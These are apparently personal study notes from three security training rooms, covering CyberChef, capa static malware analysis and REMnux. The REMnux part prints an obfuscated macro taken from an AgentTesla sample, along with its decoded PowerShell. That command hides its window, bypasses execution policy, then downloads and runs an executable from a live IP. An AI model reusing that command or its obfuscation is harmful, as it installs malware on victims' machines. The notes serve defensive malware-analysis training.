# 🧑‍🍳 CyberChef: The Basics

CyberChef is a simple, intuitive web-based application designed to help with various “cyber” operation tasks within your web browser. Think of it as a **Swiss Army knife for data** — a toolbox of different tools designed to do specific tasks. These tasks range from simple encodings like XOR or Base64 to complex operations like AES encryption or RSA decryption. CyberChef operates on **recipes**, a series of operations executed in order.

---

## 🧩 The Four Main Areas of CyberChef

CyberChef consists of four areas, each with distinct components and features:

1. **Operations**
2. **Recipe**
3. **Input**
4. **Output**

---

## ⚙️ Operations Area

This area is a repository of all operations that CyberChef can perform, organized into categories for easy access. You can search for operations to quickly find what you need.

### Common Operations

| Operation | Description | Example |
|------------|--------------|----------|
| From Morse Code | Translates Morse Code into (upper case) alphanumeric characters. | `- .... .-. . .- - ...` → `THREATS` |
| URL Encode | Encodes problematic characters into percent-encoding format. | `https://tryhackme.com/r/room/cyberchefbasics` → `https%3A%2F%2Ftryhackme%2Ecom%2Fr%2Froom%2Fcyberchefbasics` |
| To Base64 | Encodes raw data into an ASCII Base64 string. | `This is fun!` → `VGhpcyBpcyBmdW4h` |
| To Hex | Converts text to hexadecimal bytes separated by a delimiter. | `This Hex conversion is awesome!` → `54 68 69 73 20 48 ...` |
| To Decimal | Converts text to its ordinal integer array. | `This Decimal conversion is awesome!` → `84 104 105 115 ...` |
| ROT13 | Simple Caesar cipher rotating characters by 13. | `Digital Forensics` → `Qvtvgny Sberafvpf` |

Hovering over an operation provides a sample, description, or link to Wikipedia for context.

---

## 🧪 Recipe Area

The **Recipe Area** is the heart of CyberChef. Here you can select, arrange, and customize operations to suit your task.

### Features

- **Save Recipe:** Save selected operations.  
- **Load Recipe:** Load previously saved recipes.  
- **Clear Recipe:** Clear the current recipe.  
- **BAKE! Button:** Executes the operations on the input.  
- **Auto Bake:** Automatically runs the recipe when changes occur.

---

## ✍️ Input Area

The input area allows you to paste, type, or drag text/files for processing.

### Features

- **Add new input tab**
- **Open folder as input**
- **Open file as input**
- **Clear input/output**
- **Reset pane layout**

---

## 💡 Output Area

Displays the processed results after the recipe runs.

### Features

- **Save output to file (.dat)**  
- **Copy raw output**  
- **Replace input with output**  
- **Maximize output pane**

---

## 🧠 CyberChef Thought Process

Before you start, use this 4-step workflow:

1. **Set a clear objective** — What do you want to achieve?  
   Example: “I found a gibberish string; I want to know what it contains.”  
2. **Input your data** — Paste or upload your data.  
3. **Select operations** — Choose operations (e.g., Base64, ROT13, URL Decode).  
4. **Check the output** — If the result isn’t right, adjust and repeat.

---

## 🧰 Common Operation Categories

### 🧭 Extractors

| Operation | Description |
|------------|--------------|
| Extract IP addresses | Extracts all IPv4 and IPv6 addresses. |
| Extract URLs | Extracts URLs (requires protocol for accuracy). |
| Extract email addresses | Extracts all email addresses in the form `name@domain.com`. |

---

### ⏰ Date and Time

| Operation | Description |
|------------|--------------|
| From UNIX Timestamp | Converts UNIX timestamp → readable datetime. |
| To UNIX Timestamp | Converts datetime → UNIX timestamp. |

Example:  
`Fri Sep 6 20:30:22 +04 2024` → `1725654622`

---

### 💾 Data Format

| Operation | Description | Example |
|------------|--------------|----------|
| From Base64 | Decodes Base64 to raw data. | `V2VsY29tZSB0byB0cnloYWNrbWUh` → `Welcome to tryhackme!` |
| URL Decode | Converts percent-encoded characters. | `%3A` → `:` |
| From Base85 | Decodes ASCII Base85 string. | `BOu!rD]j7BEbo7` → `hello world` |
| From Base58 | Decodes Base58 string (no l, I, 0, O). | `AXLU7qR` → `Thm58` |
| To Base62 | Encodes binary → Base62 ASCII. | `Thm62` → `6NiRkOY` |

---

## 🔢 Base64 Encoding (Manual Walkthrough)

Example: Encoding “THM”.

1. **Convert to Binary**  
   - T = `01010100`, H = `01001000`, M = `01001101`  
   → Combined: `010101000100100001001101`

2. **Split into 6-bit groups → Convert to Decimal**  
   `010101 000100 100001 001101` → 21, 4, 33, 13

3. **Map Decimal to Base64 Table**  
   | Decimal | Character |
   |----------|------------|
   | 21 | V |
   | 4 | E |
   | 33 | h |
   | 13 | N |

   ✅ Final Base64 = `VEhN`

---

### 🌐 URL Decode Quick Reference

| Character | UTF-8 Code |
|------------|-------------|
| : | %3A |
| / | %2F |
| . | %2E |
| = | %3D |
| # | %23 |

---

## 🏁 Summary

CyberChef is a **powerful all-in-one data transformation and analysis tool**. Whether you’re decoding Base64, analyzing URLs, or extracting data, its visual interface simplifies complex processes. While CyberChef excels at manual and small-scale processing, for large-scale automation, consider pairing it with dedicated tools or scripts.

# CAPA: The Basics
_A quick, practical guide to static malware capability analysis with **capa**_

> **Author:** David Olivares  
> **Last updated:** 2025-10-23

---

## Table of Contents
- [Overview](#overview)
- [What is CAPA?](#what-is-capa)
- [Why CAPA matters](#why-capa-matters)
- [Quickstart](#quickstart)
  - [Basic usage](#basic-usage)
  - [Helpful CLI options](#helpful-cli-options)
- [Sample Output Walkthrough](#sample-output-walkthrough)
  - [File identity block](#file-identity-block)
  - [MITRE ATT&CK mapping](#mitre-attck-mapping)
  - [MAEC mapping](#maec-mapping)
  - [MBC mapping](#mbc-mapping)
  - [Capabilities & Namespaces](#capabilities--namespaces)
- [Understanding ATT&CK, MAEC, and MBC](#understanding-attck-maec-and-mbc)
  - [ATT&CK format & examples](#attck-format--examples)
  - [MAEC: common values](#maec-common-values)
  - [MBC: objectives, behaviors, micro-behaviors](#mbc-objectives-behaviors-micro-behaviors)
  - [Methods (sub-techniques)](#methods-sub-techniques)
- [Very Verbose + JSON + Web Explorer](#very-verbose--json--web-explorer)
  - [Generate verbose JSON](#generate-verbose-json)
  - [Explore with capa Web Explorer](#explore-with-capa-web-explorer)
  - [Rule match examples](#rule-match-examples)
- [Conclusion](#conclusion)

---

## Overview
One of the challenges in analyzing potentially malicious software is the risk of compromising the analyst’s machine. Using **static analysis** tools helps reduce that risk by avoiding execution. This guide focuses on static analysis with **capa**—a tool that identifies capabilities in binaries by matching them against a large, curated ruleset.

## What is CAPA?
**capa** (Common Analysis Platform for Artifacts) is developed by the FireEye/Mandiant team. It identifies capabilities in:
- Portable Executables (PE)
- ELF binaries
- .NET modules
- Shellcode
- Sandbox reports

It applies **rules** that describe common behaviors (e.g., network comms, file I/O, process injection) and reports what the program appears _capable_ of doing.

**Why it’s powerful:** capa encapsulates years of reverse-engineering knowledge into an automated engine—ideal for analysts who need quick functional insight without deep RE work.

## Why CAPA matters
- **Faster triage:** Quickly determine what a binary can do (e.g., persist, beacon, inject).
- **Defender alignment:** Output maps to **MITRE ATT&CK**, **MAEC**, and **MBC**, which aids incident response, hunting, and reporting.
- **Consistency:** Standard vocabulary for behaviors and capabilities across teams.

---

## Quickstart

### Basic usage
From PowerShell (example path used in a lab VM):
```powershell
PS C:\Users\Administrator\Desktop\capa> .\capa.exe .\cryptbot.bin
```

You’ll see loading progress, then capa analyzes the program and prints a summary and capability table.

### Helpful CLI options
| Option | Description | Example |
|---|---|---|
| `-h, --help` | Show help and exit | `capa -h` |
| `-v, --verbose` | Enable verbose output | `capa.exe .\cryptbot.bin -v` |
| `-vv, --vverbose` | Enable **very** verbose output (slow) | `capa.exe .\cryptbot.bin -vv` |

> **Tip:** Use `-v` / `-vv` when you’re ready to inspect _why_ a rule matched.

---

## Sample Output Walkthrough

### File identity block
```
md5:    3b9d26d2e7433749f2c32edb13a2b0a2
sha1:   969437df8f4ad08542ce8fc9831fc49a7765b7c5
sha256: ae7bc6b6f6ecb206a7b957e4bb86e0d11845c5b2d9f7a00a482bef63b567ce4c
analysis: static
os: windows
format: pe
arch: i386
path: /home/strategos/Room-CAPA/cryptbot.bin
```
- **analysis**: how capa analyzed the sample (static here)  
- **os, format, arch**: context (Windows PE, i386)  
- **hashes**: stable file identity for case work

### MITRE ATT&CK mapping
```
DEFENSE EVASION: Obfuscated Files or Information [T1027]
DEFENSE EVASION: Obfuscated Files or Information::Indicator Removal from Tools [T1027.005]
DEFENSE EVASION: Virtualization/Sandbox Evasion::System Checks [T1497.001]
DISCOVERY: File and Directory Discovery [T1083]
EXECUTION: Command and Scripting Interpreter::PowerShell [T1059.001]
EXECUTION: Shared Modules [T1129]
IMPACT: Resource Hijacking [T1496]
PERSISTENCE: Scheduled Task/Job::At [T1053.002]
PERSISTENCE: Scheduled Task/Job::Scheduled Task [T1053.005]
```
ATT&CK helps you map behaviors to adversary tactics/techniques for triage and hunting.

### MAEC mapping
```
MAEC Category: launcher
```
Common capa MAEC values:
| MAEC Value | Description |
|---|---|
| **Launcher** | Triggers malware-like actions (drop, persist, C2, execute) |
| **Downloader** | Retrieves and executes additional payloads/resources |

### MBC mapping
Example rows (subset):
```
ANTI-BEHAVIORAL ANALYSIS: Virtual Machine Detection [B0009]
ANTI-STATIC ANALYSIS: Executable Code Obfuscation::Argument Obfuscation [B0032.020]
ANTI-STATIC ANALYSIS: Executable Code Obfuscation::Stack Strings [B0032.017]
COMMUNICATION: HTTP Communication [C0002]
DATA: Encode Data::Base64 [C0026.001]
DATA: Encode Data::XOR [C0026.002]
EXECUTION: Command and Scripting Interpreter [E1059]
FILE SYSTEM: Create/Delete/Read/Write File [C0046/C0047/C0051/C0052]
MEMORY: Allocate Memory [C0007]
PROCESS: Create Process [C0017]
```
MBC offers malware-focused labeling (objectives/behaviors) complementary to ATT&CK.

### Capabilities & Namespaces
A key capa table connects **Capabilities** to **Namespaces** (groupings of similar rules). Example subset:
| Capability | Namespace |
|---|---|
| reference anti-VM strings | anti-analysis/anti-vm/vm-detection |
| contain obfuscated stackstrings | anti-analysis/obfuscation/string/stackstring |
| reference HTTP User-Agent string | communication/http |
| encode data using XOR | data-manipulation/encoding/xor |
| create process on Windows | host-interaction/process/create |
| allocate or change RWX memory | host-interaction/process/inject |
| reference cryptocurrency strings | impact/cryptocurrency |
| run PowerShell expression | load-code/powershell |
| schedule task via schtasks | persistence/scheduled-tasks |

> **Note:** The **Capability** name typically mirrors the matching rule’s YAML filename (spaces → dashes), e.g., `reference base64 string` ↔ `reference-base64-string.yml`. Some exceptions live under the **nursery** TLN (work-in-progress rules).

---

## Understanding ATT&CK, MAEC, and MBC

### ATT&CK format & examples
| Format | Sample | Explanation |
|---|---|---|
| `Tactic::Technique::ID` | `Defense Evasion::Obfuscated Files or Information::T1027` | Tactic + Technique + Technique ID |
| `Tactic::Technique::Sub-technique::Txxxx.yyy` | `Defense Evasion::Obfuscated Files or Information::Indicator Removal from Tools T1027.005` | Adds sub-technique + dotted ID |

### MAEC: common values
| MAEC Value | Description |
|---|---|
| **Launcher** | Drops payloads, enables persistence, connects to C2, executes functions |
| **Downloader** | Fetches payloads/resources, updates, secondary stages, configs |

### MBC: objectives, behaviors, micro-behaviors
**Objectives** (subset):
- Anti-Behavioral Analysis, Anti-Static Analysis, Collection, Command and Control, Credential Access, Defense Evasion, Discovery, Execution, Exfiltration, Impact, Lateral Movement, Persistence, Privilege Escalation

**Micro-Objectives** (subset):
| Micro-Objective | Examples |
|---|---|
| PROCESS | Create/terminate process, set thread context, check mutex |
| MEMORY | Allocate/change/free memory protection |
| COMMUNICATION | DNS/FTP/HTTP/ICMP/SMTP traffic |
| DATA | Check strings, compress/decode/encode |

**Behaviors & Micro-behaviors** (subset):
| Objective | Behavior | ID | Explanation |
|---|---|---|---|
| ANTI-BEHAVIORAL ANALYSIS | Virtual Machine Detection | B0009 | Checks VM artifacts |
| ANTI-STATIC ANALYSIS | Executable Code Obfuscation | B0032 | Obfuscated code to hinder static analysis |
| EXECUTION | Command and Scripting Interpreter | E1059 | Use of cmd/PowerShell/Bash/Python/etc. |
| DISCOVERY | File and Directory Discovery | E1083 | Enumerate files/dirs |
| DEFENSE EVASION | Obfuscated Files or Information | E1027 | Encode/encrypt to evade analysis |

**Micro-behaviors** (subset):
| Micro-Obj | Micro-Behavior | ID | Explanation |
|---|---|---|---|
| MEMORY | Allocate Memory | C0007 | Common for unpacking and execution |
| PROCESS | Create Process | C0017 | New process (e.g., via WMI or suspended) |
| COMMUNICATION | HTTP Communication | C0002 | Initiate HTTP |
| DATA | Check String | C0019 | Evaluate strings (ASCII, CCN, len) |
| DATA | Encode Data | C0026 | Base64 / XOR encoding |
| FILE SYSTEM | Create/Delete/Read/Write File | C0046/C0047/C0051/C0052 | File I/O primitives |

### Methods (sub-techniques)
| Behavior | Method | ID | Explanation |
|---|---|---|---|
| Executable Code Obfuscation | Argument Obfuscation | B0032.020 | Compute API args at runtime |
| Executable Code Obfuscation | Stack Strings | B0032.017 | Build/decrypt strings on stack |
| HTTP Communication | Read Header | C0002.014 | Read HTTP header |
| Encode Data | Base64 | C0026.001 | Base64 encoding |
| Encode Data | XOR | C0026.002 | XOR encoding |
| Obfuscated Files or Information | Encoding – Standard Algorithm | E1027.m02 | Uses a standard scheme (e.g., base64) |

---

## Very Verbose + JSON + Web Explorer

### Generate verbose JSON
Create a deeply detailed JSON for exploration:
```powershell
PS C:\Users\Administrator\Desktop\capa> .\capa.exe -j -vv .\cryptbot.bin > cryptbot_vv.json
```

You can also view a pre-generated text dump:
```powershell
PS C:\Users\Administrator\Desktop\capa> Get-Content .\cryptbot_vv.txt
```

### Explore with capa Web Explorer
1. Open the **capa Web Explorer** (online or the offline HTML on the VM).  
2. Click **Upload from local** and select `cryptbot_vv.json`.  
3. Browse capabilities → click a capability to see **which rule features matched** (strings, API calls, constants, etc.).

### Rule match examples
**Anti-VM (VMware):**
- Rule: `reference-anti-vm-strings-targeting-vmware.yml`  
- Feature: `string: /VMWare/i` (regex) → capa flags VMware-related artifacts.

**Scheduled Tasks (schtasks):**
```yaml
rule:
  meta:
    name: schedule task via schtasks
    namespace: persistence/scheduled-tasks
  features:
    - and:
      - match: host-interaction/process/create
      - or:
        - and:
          - string: /schtasks/i
          - string: /\/create /i
        - string: /Register-ScheduledTask /i
```
The feature set shows why the rule matched: presence of `schtasks` + `/create` (or `Register-ScheduledTask`) plus a process-create match.

---

## Conclusion
In this room/guide, we covered how **capa** accelerates static analysis by detecting behaviors and mapping them to **ATT&CK**, **MAEC**, **MBC**, and **Capabilities/Namespaces**. The **very verbose** JSON plus the **Web Explorer** makes it easy to see **exactly** what triggered a rule. Together, these workflows speed up triage, sharpen hunting, and strengthen incident response.

---

### References & Notes
- capa reports vary by sample and ruleset version; results shown here are illustrative.
- Use `-v`/`-vv` judiciously—great for insight, but slower on large samples.
- Consider running capa inside an analysis VM even for static analysis.

---

**Quick Recap**  
- capa identifies **what** a program can do.  
- Output aligns with **ATT&CK / MAEC / MBC** for clear reporting.  
- Use **Web Explorer** to understand **why** rules matched.

Happy hunting. 🛡️

# REMnux — Getting Started (formatted notes)
**Source:** User notes from REMnux: Getting Started room  
**Prepared for:** GitHub (Markdown `.md`)  
**Date:** October 27, 2025

---

## Overview
Analysing potentially malicious software can be daunting — especially during an active security incident. REMnux is a specialized Linux distribution preloaded with forensic and malware-analysis tools (e.g., Volatility, YARA, Wireshark, oledump, INetSim) to create a sandboxed analysis environment. This guide walks through a hands-on introduction using REMnux: static analysis with `oledump.py`, dynamic simulation with `INetSim`, memory preprocessing with Volatility 3, and the `strings` utility.

---

## Table of contents
- [OLE / VBA static analysis with `oledump.py`](#ole--vba-static-analysis-with-oledumppy)
- [Decompressing and cleaning embedded macros (CyberChef)](#decompressing-and-cleaning-embedded-macros-cyberchef)
- [INetSim — simulating network services and downloads](#inetsim---simulating-network-services-and-downloads)
- [Volatility 3 — memory preprocessing (Windows plugins)](#volatility-3---memory-preprocessing-windows-plugins)
- [Batch preprocessing loop example](#batch-preprocessing-loop-example)
- [Extracting strings (ASCII + Unicode)](#extracting-strings-ascii--unicode)
- [Summary and notes](#summary-and-notes)

---

## OLE / VBA static analysis with `oledump.py`

**Context:** We analyze `agenttesla.xlsm` located in `/home/ubuntu/Desktop/tasks/agenttesla/` on the REMnux VM.

**Basic oledump usage**
```bash
# list OLE streams (run from the folder containing agenttesla.xlsm)
oledump.py agenttesla.xlsm
```

**Sample output interpretation**
```
A: xl/vbaProject.bin
 A1:       468 'PROJECT'
 A2:        62 'PROJECTwm'
 A3: m     169 'VBA/Sheet1'
 A4: M     688 'VBA/ThisWorkbook'
 A5:         7 'VBA/_VBA_PROJECT'
 A6:       209 'VBA/dir'
```
- The capital `M` before an item indicates a macro stream — check these first.
- The `A` index is the OLE container; the numeric index indicates the stream.

**View a specific stream (example: stream 4)**
```bash
oledump.py agenttesla.xlsm -s 4
# Output will show the raw (often compressed) VBA data
```

**Decompress VBA macros for readability**
```bash
oledump.py agenttesla.xlsm -s 4 --vbadecompress
```

---

## Decompressing and cleaning embedded macros (CyberChef)

**Observed obfuscated VBA snippet (example)**
```
Sqtnew = "^p*o^*w*e*r*s^^*h*e*l^*l* *^-*W*i*n*^d*o*w^*S*t*y*^l*e* *h*i*^d*d*^e*n^* *-*e*x*^e*c*u*t*i*o*n*pol^icy* *b*yp^^ass*;* $TempFile* *=* *[*I*O*.*P*a*t*h*]*::GetTem*pFile*Name() | Ren^ame-It^em -NewName { $_ -replace 'tmp$', 'exe' }  Pass*Thru; In^vo*ke-We^bRe*quest -U^ri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -Out*File $TempFile; St*art-Proce*ss $TempFile;"
Sqtnew = Replace(Sqtnew, "*", "")
Sqtnew = Replace(Sqtnew, "^", "")
```

**Technique to clean the string (CyberChef approach)**
1. Paste the raw Sqtnew value into CyberChef input.
2. Use _Find / Replace_ operation twice:
   - Replace `*` with an empty string.
   - Replace `^` with an empty string.
3. Result (readable PowerShell command):
```powershell
"powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' }  PassThru; Invoke-WebRequest -Uri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -OutFile $TempFile; Start-Process $TempFile;"
```

**Notes about the recovered command**
- `-WindowStyle hidden` hides the PowerShell window from the user.
- `-executionpolicy bypass` ignores local script execution restrictions.
- `Invoke-WebRequest -Uri ... -OutFile $TempFile` downloads a remote executable.
- `Start-Process $TempFile` executes the downloaded file.
- This demonstrates a common pattern: macro → PowerShell → remote executable download → execution.

---

## INetSim — simulating network services and downloads

**Purpose:** Emulate network services locally so malware can be observed interacting with servers without touching the internet.

**1. Configure REMnux IP and INetSim**
- Determine machine IP:
```bash
ifconfig
# or check the `ubuntu@MACHINE_IP` prompt
```

- Edit INetSim config and set DNS default IP:
```bash
sudo nano /etc/inetsim/inetsim.conf
# find: #dns_default_ip 0.0.0.0
# change to: dns_default_ip MACHINE_IP   (remove the leading #)
# save (Ctrl+O), exit (Ctrl+X)
```

- Verify:
```bash
cat /etc/inetsim/inetsim.conf | grep dns_default_ip
# Expected output: dns_default_ip MACHINE_IP
```

- Start INetSim:
```bash
sudo inetsim
# Look for: "Simulation running" in the output
```

**2. From AttackBox (or another VM), access REMnux INetSim web UI**
- Open browser on AttackBox and visit:
```
https://MACHINE_IP
# Click through certificate warnings (self-signed) --> Accept the risk
```

**3. Download a payload from INetSim (simulated)**
```bash
sudo wget https://MACHINE_IP/second_payload.zip --no-check-certificate
sudo wget https://MACHINE_IP/second_payload.ps1 --no-check-certificate
```
- Files downloaded are fake/sample files served by INetSim.

**4. INetSim report**
- Stop INetSim (Ctrl+C in the terminal running it) and check report directory:
```bash
# Reports saved to: /var/log/inetsim/report/
sudo cat /var/log/inetsim/report/report.<session_id>.txt
```

**Sample report lines**
```
HTTPS connection, method: GET, URL: https://MACHINE_IP/second_payload.ps1, file name: /var/lib/inetsim/http/fakefiles/sample.html
HTTPS connection, method: GET, URL: https://MACHINE_IP/second_payload.zip, file name: /var/lib/inetsim/http/fakefiles/sample.html
```

---

## Volatility 3 — memory preprocessing (Windows plugins)

**Context:** Use Volatility 3 to extract artifact listings from a Windows memory capture `wcry.mem` in `/home/ubuntu/Desktop/tasks/Wcry_memory_image/`.

**Commonly used plugins (examples in the room)**
- `windows.pstree.PsTree` — process tree (parent → child)
- `windows.pslist.PsList` — list active processes
- `windows.cmdline.CmdLine` — process command-line arguments
- `windows.filescan.FileScan` — scan for file objects
- `windows.dlllist.DllList` — modules loaded by processes
- `windows.malfind.Malfind` — potential injected code regions
- `windows.psscan.PsScan` — scan for process objects

**Run each plugin (example)**
```bash
# become root
sudo su
cd /home/ubuntu/Desktop/tasks/Wcry_memory_image/
# run plugin example
vol3 -f wcry.mem windows.pstree.PsTree
vol3 -f wcry.mem windows.pslist.PsList
vol3 -f wcry.mem windows.cmdline.CmdLine
# ...and so on for other plugins
```

---

## Batch preprocessing loop example

Save the output of several Volatility plugins to separate text files (useful for triage / indexing):
```bash
for plugin in windows.malfind.Malfind windows.psscan.PsScan windows.pstree.PsTree windows.pslist.PsList windows.cmdline.CmdLine windows.filescan.FileScan windows.dlllist.DllList; do
  vol3 -q -f wcry.mem $plugin > wcry.$plugin.txt
done
```
- `-q` quiets progress output.
- Each plugin's output is redirected to `wcry.<plugin>.txt` for later review.

---

## Extracting strings (ASCII + Unicode)

Use `strings` to extract readable text from memory images in different encodings:

```bash
strings wcry.mem > wcry.strings.ascii.txt
strings -e l wcry.mem > wcry.strings.unicode_little_endian.txt
strings -e b wcry.mem > wcry.strings.unicode_big_endian.txt
```

- ASCII and Unicode string dumps help in quick triage and keyword searching.

---

## Summary and notes
- REMnux is a preconfigured distro that accelerates malware and forensic analysis by bundling many common tools.
- `oledump.py` helps identify and extract VBA macro streams from Office documents; `--vbadecompress` aids readability.
- Small obfuscation tricks (character insertion/replacement) are often used to hide PowerShell payloads; CyberChef or simple find/replace can recover readable commands.
- INetSim provides a controlled environment for observing network behavior (downloads, requests) without touching the internet.
- Volatility 3 + `strings` are useful for preprocessing memory captures; automate plugin runs to save time during triage.
- Always work inside isolated VMs and sandboxed networks when handling suspected malicious files.

---

